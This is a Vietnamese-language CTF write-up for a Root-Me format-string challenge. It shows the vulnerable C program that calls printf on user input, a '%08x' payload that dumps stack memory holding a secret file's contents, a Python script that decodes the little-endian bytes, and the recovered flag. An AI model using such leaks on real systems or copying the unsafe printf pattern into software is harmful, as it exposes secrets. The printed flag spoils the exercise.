# Co-che-hoat-dong-cua-ma-doc - challenge 3 CTF Write up
```html
ELF x86 - Format string bug basic 1 : ssh -p 2222 app-systeme-ch5@challenge02.root-me.org
```

![image](https://user-images.githubusercontent.com/64201705/119268818-ced46980-bc1e-11eb-9a74-16c4bf74d99d.png)

## Write up

```Text
Sau khi SSH vào server thì ta dùng lệnh cat để in code trong file source code ra
```
Ta sẽ được như này:
![image](https://user-images.githubusercontent.com/64201705/119268828-deec4900-bc1e-11eb-8c25-d4800747e8f9.png)

```C
#include <stdio.h>
#include <unistd.h>

int main(int argc, char *argv[]){
        FILE *secret = fopen("/challenge/app-systeme/ch5/.passwd", "rt");
        char buffer[32];
        fgets(buffer, sizeof(buffer), secret);
        printf(argv[1]);
        fclose(secret);
        return 0;
}
```
Rõ ràng ta thấy để vào in đươc nội dung file passwd ra bằng một user nào đó đang dùng tại máy chủ này thì ta sẽ cần in nội dung của nó nằm trong stack được đọc bởi câu lệnh 
``` FILE *secret = fopen("/challenge/app-systeme/ch5/.passwd", "rt"); ```
Do buffer có 32 bytes nên đầu tiên ta sẽ chạy thử một đoạn payload xem chương trình có in ra các giá trị nằm trong stack hay không:
![image](https://user-images.githubusercontent.com/64201705/119269273-00e6cb00-bc21-11eb-9cf0-b78e53086928.png)
Ta thấy nó in ra các giá trị nằm trong stack:
```Bash
app-systeme-ch5@challenge02:~$ ./ch5 `python -c "print '%08x,'*32"`
00000020,0804b160,0804853d,00000009,bffffc9b,b7e1b589,bffffb74,b7fc3000,b7fc3000,0804b160,39617044,28293664,6d617045,bf000a64,0804861b,00000002,bffffb74,bffffb80,e5789100,bffffae0,00000000,00000000,b7e03f21,b7fc3000,b7fc3000,00000000,b7e03f21,00000002,bffffb74,bffffb80,bffffb04,00000001,
```

Hệ nhị phân ELF được cung cấp cho chúng ta là 32 bit. Kiến trúc X86
Do đó, tất cả các byte nhận được cấp cho chúng ta từ ngăn xếp đều ở dạng đảo ngược - Little Endian.

Ta sẽ đảo ngược các giá trị trên bằng code Python:
```Python
bytes = [ "00000020", "0804b160", "0804853d", "00000009",
          "bffffcce", "b7e1c4a9", "bffffba4", "b7fc4000",
          "b7fc4000", "0804b160", "39617044", "28293664",
          "6d617045", "bf000a64", "0804861b", "00000002",
          "bffffba4", "bffffbb0", "119eaa00", "bffffb10",
          "00000000", "00000000", "b7e04e81", "b7fc4000",
          "b7fc4000", "00000000", "b7e04e81", "00000002",
          "bffffba4", "bffffbb0", "bffffb34", "00000001" ]

bytes2 = []

for y in bytes:
    little_endian = y[6:] + y[4:-2] + y[2:-4] + y[0:-6]
    bytes2.append(little_endian)
   

for x in bytes2:
    print x.decode('hex'),
```
```https://paiza.io/projects/OFH3jVsedodVH4xQtU5ehg?language=python```
Ta sẽ dùng trang này để chạy code trên:
Và kết quả là:
```bash
  `� =� 	 ���� ��� ���� @�� @�� `� Dpa9 d6)( Epam d
� �  ���� ���� �� ���   �N� @�� @��  �N�  ���� ���� 4��� 
```
Như vậy flag hay password là:

## Dpa9d6)(Epamd



